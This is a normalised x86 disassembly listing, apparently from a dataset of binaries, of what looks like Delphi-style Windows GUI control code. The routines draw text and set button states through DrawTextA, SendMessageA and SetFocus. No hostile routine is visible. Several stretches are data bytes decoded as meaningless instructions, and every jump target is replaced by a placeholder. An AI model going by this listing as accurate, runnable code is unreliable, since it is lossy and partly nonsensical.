push 0x1
push 0x1
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41cc28
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_404114
push eax
mov eax [ ebp - 0x4 ]
call sub_404314
push eax
mov eax [ ebx + 0x160 ]
call sub_41db3c
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_41cc28
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_404114
push eax
mov eax [ ebp - 0x4 ]
call sub_404314
push eax
mov eax [ ebx + 0x160 ]
call sub_41db3c
push eax
call DrawTextA
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x26
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432f19
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
sub_432f23
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffffd0
mov ebx eax
mov esi [ ebx + 0x160 ]
mov eax ebx
call sub_43314c
test al al
jne r-xdata
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_41d510
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
mov al [ ebx + 0x16f ]
mov di [ eax * 2 + rw-data ]
or di 0x40
xor eax eax
mov al [ ebx + 0x16c ]
or di [ eax * 2 + rw-data ]
movzx edi di
cmp [ ebx + 0x16e ] 0x0
je r-xdata
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_41d3f4
xor edx edx
mov eax [ esi + 0x14 ]
call sub_41d510
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x20 ]
mov eax esi
call sub_41d798
mov edx esp
mov ecx edi
mov eax ebx
mov si 0xffc6
call sub_403300
add esp 0x30
pop edi
pop esi
pop ebx
retn
push edi
lea esi [ esp + 0x4 ]
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov ecx edi
or ecx 0x400
lea edx [ esp + 0x10 ]
mov eax ebx
mov si 0xffc6
call sub_403300
cmp [ ebx + 0x16e ] 0x2
jne r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
sar eax 0x1
jns r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
jmp r-xdata
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
adc eax 0x0
sub_433044
push ebx
push esi
push edi
add esp 0xffffffec
mov edi eax
test [ edi + 0x1c ] 0x2
jne r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x16d ] 0x0
je r-xdata
lea edx [ esp + 0x1 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
call GetDC
mov ebx eax
mov edx ebx
mov eax [ edi + 0x160 ]
call sub_41dbbc
xor eax eax
mov al [ edi + 0x16f ]
mov cx [ eax * 2 + rw-data ]
or cx 0x440
movzx ecx cx
lea edx [ esp + 0x1 ]
mov eax edi
mov si 0xffc6
call sub_403300
xor edx edx
mov eax [ edi + 0x160 ]
call sub_41dbbc
push ebx
push 0x0
call ReleaseDC
mov ebx [ edi + 0x40 ]
mov al [ edi + 0x16c ]
mov [ esp ] al
mov eax edi
mov si 0xffc8
call sub_403300
test al al
je r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax esp
call sub_4370d8
mov eax [ esp + 0x9 ]
push eax
mov eax [ esp + 0x11 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ edi + 0x48 ]
sub eax [ esp + 0x9 ]
add ebx eax
sub_433188
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_43314c
cmp bl al
je r-xdata
mov [ esi + 0x188 ] 0x1
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4331e8
push esi
push edi
mov edi eax
cmp dl [ edi + 0x16f ]
je r-xdata
pop edi
pop esi
retn
mov [ edi + 0x16f ] dl
mov eax edi
mov si 0xffc7
call sub_403300
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_433210
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43981c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x168 ]
jne r-xdata
xor eax eax
mov [ edi + 0x168 ] eax
sub_433274
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_433301
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x168 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433308
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43a34c
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_451470
test al al
je r-xdata
mov ebx [ ebx + 0x168 ]
mov eax ebx
mov si 0xffb8
call sub_403300
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
sub_433358
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43c820
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
mov [ ebx + 0x28 ] eax
pop esi
pop ebx
retn
sub_43337c
push ebx
mov ebx eax
mov eax ebx
call sub_446884
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x28 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
pop edx
cmp dl [ eax + 0x69 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4333b4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x1
xor edx edx
push ebp
push sub_43340a
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x0
retn
sub_433418
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43c854
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_43346c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_4415f8
mov eax esi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov dl [ esi + 0x69 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
sub_4334c0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4334e4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ edi ]
sub eax 0x201
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
sub eax 0x2
je r-xdata
mov edx edi
mov eax ebx
call sub_43e53c
mov eax ebx
mov si 0xffb5
call sub_403300
test al al
jne r-xdata
sub eax 0xbb0e
je r-xdata
mov [ ebx + 0x208 ] 0x1
mov eax ebx
call sub_440b28
push eax
call SetFocus
mov [ ebx + 0x208 ] 0x0
mov eax ebx
mov si 0xffb5
call sub_403300
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
sub_43355c
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_42f358
mov ebx eax
mov eax ebx
call sub_42f438
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_440b28
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_42f5d0
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4335a8
push ebx
push esi
mov esi edx
mov ebx eax
call sub_42f358
call sub_42f438
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_43ef7c
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_4335d4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43d9b4
cmp [ ebx + 0x209 ] 0x0
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x2000
sub_43360c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_433418
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x4b
mov eax esi
call sub_439b08
mov edx 0x19
mov eax esi
call sub_439b2c
mov dl 0x1
mov eax esi
call sub_440d5c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax esi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_433698
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov eax ebp
call sub_440e2c
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor esi esi
mov si 0x1
jmp r-xdata
push 0x1
push edi
push 0xf4
mov eax ebp
call sub_440b28
push eax
call SendMessageA
push 0xfffffff0
mov eax ebp
call sub_440b28
push eax
call GetWindowLongA
and eax 0xf
movzx edi si
cmp eax edi
je r-xdata
sub_4336ec
push ebx
mov ebx eax
mov [ ebx + 0x210 ] dl
mov eax ebx
call sub_440e2c
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_4514e0
test eax eax
je r-xdata
mov edx [ eax + 0x220 ]
push edx
xor ecx ecx
mov edx 0xb007
call sub_43b4f4
sub_433720
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4335d4
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_43d8e0
xor eax eax
mov al [ ebx + 0x210 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_433788
push ebx
push esi
push edi
mov edi edx
mov ebx eax
cmp [ edi + 0x4 ] 0xd
jne r-xdata
cmp [ edi + 0x4 ] 0x1b
jne r-xdata
cmp [ ebx + 0x212 ] 0x0
jne r-xdata
mov edx edi
mov eax ebx
call sub_43ffa4
cmp [ ebx + 0x211 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
call sub_4513e8
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax ebx
mov si 0xffb8
call sub_403300
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403300
mov [ edi + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4337f5
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43386e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43a34c
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_451470
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_43ffac
mov eax ebx
mov si 0xffb8
call sub_403300
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403300
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433875
sub_43387c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ esi + 0x8 ]
mov eax edi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
cmp ebx edi
sete al
mov [ ebx + 0x212 ] al
jmp r-xdata
mov dl [ ebx + 0x212 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov edx esi
mov eax ebx
call sub_43ffb4
pop edi
pop esi
pop ebx
retn
sub_4338d0
push ebx
push esi
mov esi edx
mov ebx eax
call sub_42f358
call sub_42f438
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_4338fc
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_42f358
mov ebx eax
mov eax ebx
call sub_42f438
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_440b28
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_42f5d0
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_433948
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_433418
mov edx 0x61
mov eax esi
call sub_439b08
mov edx 0x11
mov eax esi
call sub_439b2c
mov dl 0x1
mov eax esi
call sub_440d5c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax esi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_4339b4
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_403300
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_4339e0
mov dl [ eax + 0x212 ]
sub dl 0x1
jb r-xdata
cmp [ eax + 0x211 ] 0x0
je r-xdata
je r-xdata
mov dl 0x1
call sub_433a68
retn
mov dl 0x2
call sub_433a68
jmp r-xdata
xor edx edx
call sub_433a68
retn
dec dl
je r-xdata
retn
mov dl 0x1
call sub_433a68
jmp r-xdata
sub_433a68
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x212 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x212 ] dl
mov eax ebx
call sub_440e2c
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
push 0x0
xor eax eax
mov al [ ebx + 0x212 ]
push eax
push 0xf1
mov eax ebx
call sub_440b28
push eax
call SendMessageA
mov eax ebx
mov si 0xffeb
call sub_403300
sub_433abc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_4335d4
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_43d8e0
mov eax ebx
mov si 0xffc8
call sub_403300
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x5
or eax edx
mov [ edi + 0x4 ] eax
and [ edi + 0x24 ] 0xfffffffc
pop edi
pop esi
pop ebx
retn
sub_433b17
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x6041173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x212 ]
push eax
push 0xf1
mov eax ebx
call sub_440b28
push eax
call SendMessageA
pop ebx
retn
sub_433b60
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_433bee
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43a34c
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_451470
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_43ffac
mov eax ebx
mov si 0xffb8
call sub_403300
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov eax ebx
mov si 0xffb5
call sub_403300
test al al
je r-xdata
mov [ edi + 0xc ] 0x1
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433bf5
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_433c0c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_433418
mov edx 0x71
mov eax esi
call sub_439b08
mov edx 0x11
mov eax esi
call sub_439b2c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax esi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_433c74
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_403300
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_433cb4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_43d858
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_43d81c
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov edi ebx
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp [ eax + 0x95 ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_446b18
sub_433d70
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x211 ]
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] bl
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_440d5c
mov eax [ ebp - 0x4 ]
call sub_440e2c
test al al
je r-xdata
test bl bl
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
and eax 0x7f
push eax
push 0xf1
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
call SendMessageA
push ebp
call sub_433cb4
pop ecx
mov eax [ ebp - 0x4 ]
call sub_439f58
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x208 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_403300
sub_433dfc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_4335d4
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_43d8e0
mov eax ebx
mov si 0xffc8
call sub_403300
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x4
or eax edx
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
retn
sub_433e53
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x637d173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x211 ]
push eax
push 0xf1
mov eax ebx
call sub_440b28
push eax
call SendMessageA
pop ebx
retn
sub_433e88
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_433efd
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43a34c
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_451470
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_43ffac
mov eax ebx
mov si 0xffb8
call sub_403300
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433f04
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_433f0c
push esi
mov esi eax
mov ax [ edx + 0x6 ]
sub ax 0x1
jb r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
retn
sub ax 0x4
je r-xdata
mov eax esi
mov si 0xffe9
call sub_403300
jmp r-xdata
pop esi
retn
sub_433f3c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_433f61
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433f68
retn
sub_434068
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_446968
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax esi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_4340a4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4340c9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4340d0
retn
sub_434174
push ebp
inc ecx
inc ebx
add [ edi + 0x41 ] bl
inc ebx
add [ ecx + 0x41 ] ch
inc ebx
add [ 0x15004341 ] cl
inc ecx
inc ebx
add [ 0x25004341 ] bl
inc ecx
inc ebx
add [ 0x35004341 ] ch
inc ecx
inc ebx
add [ 0x45004341 ] bh
inc ecx
pop edi
inc ecx
cmp dh [ ecx + eax * 2 + 0x43 ]
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
inc ebx
add [ ebp + 0x41 ] cl
inc ebx
add ch ch
inc eax
inc ebx
add ch dh
inc eax
inc ebx
add ch bh
inc eax
inc ebx
add [ 0xffffffffe5004341 ] al
xor eax 0x3d004341
inc ecx
inc ebx
add [ ebp + 0x41 ] al
cmp dh [ ecx + eax * 2 + 0x43 ]
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 4 - 0x4 ] ah
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
inc eax
inc ebx
add [ ebx ] al
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
add eax 0xe5004341
cmp dh [ ecx + eax * 2 + 0x43 ]
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + eax * 2 + 0x43 ] bl
add [ eax + 0x4341 ] bh
add [ eax ] al
add [ edx + eax * 2 + 0x43 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x42 ] dh
inc ebx
add [ eax + eax ] ah
add [ eax ] al
xchg esp eax
adc [ eax ] eax
dec esp
xor eax [ eax ]
je r-xdata
fdiv [ ebx ]
rcl [ ebp + 0x68 ] 0x3d
inc ebx
inc ebx
add [ edi + edi * 8 + 0x30 ] ah
mov [ fs : eax ] esp
mov eax esi
call sub_403e54
test edi edi
jne r-xdata
inc eax
add [ eax + 0x60004055 ] al
xor eax [ eax ]
push esp
xor eax [ eax ]
nop
push ebp
inc eax
add [ eax - 0x3ffbfd0 ] bh
dec esp
inc ebx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x140040 ] dl
add [ eax ] al
nop
dec ebp
inc edx
add [ eax + eax ] bl
add [ eax ] al
push cs
push esp
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
imul esp [ ebp + 0x77 ] 0x408d7265
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43433d
push [ fs : eax ]
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_403eec
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403ea8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434344
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e78
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4041d4
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_434288
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43433d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403e54
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_403eec
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403ea8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434344
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e78
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4041d4
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_434358
push ebx
mov ebx eax
mov eax ebx
call sub_434688
cmp [ ebx + 0x1c ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
lea eax [ ebx + 0x1c ]
call sub_4054f4
sub_434394
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
